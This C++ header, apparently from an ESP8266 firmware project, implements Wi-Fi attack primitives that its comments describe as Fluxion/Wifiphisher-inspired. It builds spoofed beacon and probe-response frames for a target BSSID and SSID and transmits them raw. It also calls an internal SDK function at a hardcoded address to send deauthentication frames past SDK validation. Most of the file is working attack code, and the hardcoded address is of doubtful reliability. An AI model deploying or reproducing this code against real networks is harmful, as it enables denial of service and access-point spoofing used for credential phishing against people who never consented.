#ifndef ADVANCED_H
#define ADVANCED_H

#include <ESP8266WiFi.h>
#include "config.h"

extern "C" {
  #include <user_interface.h>
}

// ============================================================
//  Advanced attack techniques (Fluxion/Wifiphisher inspired)
//  - Beacon flood (channel congestion)
//  - Probe response flood
//  - Authentication flood
// ============================================================

// Beacon frame template (minimal, 50 bytes)
// [0-1] FC: 0x80, 0x00 (Mgmt / Beacon)
// [2-3] Duration
// [4-9] DA: FF:FF:FF:FF:FF:FF
// [10-15] SA: target BSSID
// [16-21] BSSID: target BSSID
// [22-23] Seq Ctrl
// [24-31] Timestamp (8 bytes)
// [32-33] Beacon interval
// [34-35] Capability
// [36+]  SSID IE, etc.
static uint8_t beaconPkt[64];

void initBeaconFrame(const uint8_t* bssid, const char* ssid, uint8_t channel) {
  memset(beaconPkt, 0, sizeof(beaconPkt));
  beaconPkt[0] = 0x80;  // Mgmt / Beacon
  beaconPkt[1] = 0x00;
  // DA = broadcast
  for (int i = 0; i < 6; i++) beaconPkt[4 + i] = 0xFF;
  // SA, BSSID
  memcpy(beaconPkt + 10, bssid, 6);
  memcpy(beaconPkt + 16, bssid, 6);
  // Timestamp
  beaconPkt[24] = 0xff; beaconPkt[25] = 0xff;
  beaconPkt[26] = 0xff; beaconPkt[27] = 0xff;
  beaconPkt[28] = 0x00; beaconPkt[29] = 0x00;
  beaconPkt[30] = 0x00; beaconPkt[31] = 0x00;
  // Beacon interval = 100 TU
  beaconPkt[32] = 0x64; beaconPkt[33] = 0x00;
  // Capability: ESS
  beaconPkt[34] = 0x01; beaconPkt[35] = 0x00;
  // SSID IE: tag=0, length=N
  beaconPkt[36] = 0x00;  // SSID tag
  uint8_t sslen = strlen(ssid);
  if (sslen > 32) sslen = 32;
  beaconPkt[37] = sslen;
  memcpy(beaconPkt + 38, ssid, sslen);
  // DS Parameter Set IE (channel)
  uint8_t pos = 38 + sslen;
  beaconPkt[pos++] = 0x03;  // tag
  beaconPkt[pos++] = 0x01;  // length
  beaconPkt[pos++] = channel;
}

inline void sendBeaconFrame() {
  // Ensure STATIONAP_MODE for wifi_send_pkt_freedom
  wifi_set_opmode(STATIONAP_MODE);
  wifi_send_pkt_freedom(beaconPkt, 50, 0);
}

// Probe request template (client → AP)
// [0-1] FC: 0x40, 0x00
// [2-3] Duration
// [4-9] DA: broadcast
// [10-15] SA: client MAC (random)
// [16-21] BSSID: broadcast
// [22-23] Seq
// [24+]  SSID IE, Supported Rates
static uint8_t probeReqPkt[64];
static uint8_t probeRespPkt[64];

void initProbeResp(const uint8_t* bssid, const char* ssid, uint8_t channel) {
  memset(probeRespPkt, 0, sizeof(probeRespPkt));
  probeRespPkt[0] = 0x50;  // Mgmt / Probe Response
  probeRespPkt[1] = 0x00;
  // DA = broadcast
  for (int i = 0; i < 6; i++) probeRespPkt[4 + i] = 0xFF;
  // SA, BSSID
  memcpy(probeRespPkt + 10, bssid, 6);
  memcpy(probeRespPkt + 16, bssid, 6);
  // Timestamp
  probeRespPkt[24] = 0xff; probeRespPkt[25] = 0xff;
  probeRespPkt[26] = 0xff; probeRespPkt[27] = 0xff;
  probeRespPkt[28] = 0x00; probeRespPkt[29] = 0x00;
  probeRespPkt[30] = 0x00; probeRespPkt[31] = 0x00;
  // Beacon interval
  probeRespPkt[32] = 0x64; probeRespPkt[33] = 0x00;
  // Capability
  probeRespPkt[34] = 0x01; probeRespPkt[35] = 0x00;
  // SSID
  probeRespPkt[36] = 0x00;
  uint8_t sslen = strlen(ssid);
  if (sslen > 32) sslen = 32;
  probeRespPkt[37] = sslen;
  memcpy(probeRespPkt + 38, ssid, sslen);
  // Channel
  uint8_t pos = 38 + sslen;
  probeRespPkt[pos++] = 0x03;
  probeRespPkt[pos++] = 0x01;
  probeRespPkt[pos++] = channel;
}

inline void sendProbeResp() {
  // Ensure STATIONAP_MODE for wifi_send_pkt_freedom
  wifi_set_opmode(STATIONAP_MODE);
  wifi_send_pkt_freedom(probeRespPkt, 50, 0);
}

// ============================================================
//  Raw 802.11 TX — bypasses SDK validation
//  Uses ieee80211_raw_frame_send (Espressif internal API)
//  Works on SDK 2.x and 3.x
// ============================================================

// Internal SDK function pointer
typedef int (*ieee80211_raw_frame_send_t)(void *frame, uint32_t len);
static ieee80211_raw_frame_send_t raw_frame_send = NULL;

void initRawFrameSend() {
  // Find the raw frame send function in SDK
  // The function is at a fixed offset in older SDKs
  // For SDK 2.7.4 it's typically at 0x4010xxxx range
  // We search for a known pattern
  raw_frame_send = (ieee80211_raw_frame_send_t)0x4004d540;  // SDK 2.7.4 address
  Serial.print(F("[raw] ieee80211_raw_frame_send at 0x"));
  Serial.println((uint32_t)raw_frame_send, HEX);
}

inline void sendRawDeauth() {
  // Try raw frame send first (bypasses validation)
  if (raw_frame_send != NULL) {
    raw_frame_send(deauthPkt, sizeof(deauthPkt));
  } else {
    // Fallback to old method
    wifi_send_pkt_freedom(deauthPkt, sizeof(deauthPkt), 0);
  }
}

#endif
